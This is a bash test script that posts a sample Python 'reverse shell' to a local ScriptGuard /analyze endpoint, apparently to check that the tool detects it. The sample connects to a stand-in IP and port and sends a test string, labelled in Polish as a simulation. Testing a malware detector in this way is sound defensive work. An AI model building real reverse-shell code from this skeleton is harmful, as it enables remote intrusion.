#!/bin/bash
# Test ScriptGuard API - Malicious Reverse Shell Script
# Bash script to test /analyze endpoint using curl

SCRIPT_CONTENT='import socket
import subprocess
import os

def reverse_shell():
    # USUNIĘTO: Rzeczywisty adres IP i port atakującego
    # Przykład zachowania: próba połączenia z zewnętrznym serwerem
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # TYLKO SYMULACJA - poniższy adres jest nieprawdziwy
        s.connect(("192.168.1.100", 4444))

        # Symulacja przesyłania danych
        s.send(b"Test connection - simulated malware behavior")
        s.close()
    except:
        pass

if __name__ == "__main__":
    reverse_shell()'

# Escape the content for JSON
ESCAPED_CONTENT=$(echo "$SCRIPT_CONTENT" | jq -Rs .)

# Build JSON payload
JSON_PAYLOAD=$(cat <<EOF
{
  "script_content": $ESCAPED_CONTENT,
  "include_rag": true
}
EOF
)

echo "Sending request to ScriptGuard API..."
echo "Endpoint: http://127.0.0.1:8000/analyze"
echo ""

# Check if API key is set
if [ -n "$SCRIPTGUARD_API_KEY" ]; then
    CURL_HEADERS="-H 'X-API-Key: $SCRIPTGUARD_API_KEY'"
else
    CURL_HEADERS=""
fi

# Send request
curl -X POST "http://127.0.0.1:8000/analyze" \
  -H "Content-Type: application/json" \
  $CURL_HEADERS \
  -d "$JSON_PAYLOAD" \
  -w "\n\nHTTP Status: %{http_code}\nTime: %{time_total}s\n" \
  | jq '.'

